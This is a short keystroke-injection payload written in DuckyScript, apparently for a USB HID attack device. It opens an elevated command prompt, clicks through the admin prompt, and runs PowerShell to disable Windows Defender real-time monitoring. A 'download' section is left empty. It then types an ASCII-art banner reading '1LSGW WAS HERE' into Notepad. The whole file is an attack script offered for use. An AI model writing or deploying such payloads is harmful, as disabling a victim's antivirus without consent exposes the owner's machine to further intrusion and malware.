```
REM disable windows defender
GUI r
DELAY 600
STRING powershell -Command "Start-Process cmd -Verb RunAs"
ENTER
DELAY 600
RIGHT
ENTER
DELAY 600
STRING powershell Set-MpPreference -DisableRealtimeMonitoring $true
DELAY 600
ENTER

REM download


REM notepad
DELAY 700
GUI r
DELAY 500
STRINGLN notepad
DELAY 600
CTRL N
STRINGLN  $$\   $$\       $$$$$$\   $$$$$$\  $$\      $$\  
STRINGLN $$$$ |  $$ |     $$  __$$\ $$  __$$\ $$ | $\  $$ |
STRINGLN \_$$ |  $$ |     $$ /  \__|$$ /  \__|$$ |$$$\ $$ |
STRINGLN   $$ |  $$ |     \$$$$$$\  $$ |$$$$\ $$ $$ $$\$$ |
STRINGLN   $$ |  $$ |      \____$$\ $$ |\_$$ |$$$$  _$$$$ |
STRINGLN   $$ |  $$ |     $$\   $$ |$$ |  $$ |$$$  / \$$$ |
STRINGLN $$$$$$\ $$$$$$$$\\$$$$$$  |\$$$$$$  |$$  /   \$$ |
STRINGLN \______|\________|\______/  \______/ \__/     \__|
STRINGLN                   1LSGW WAS HERE                  
MOUSESCROLL 25
```
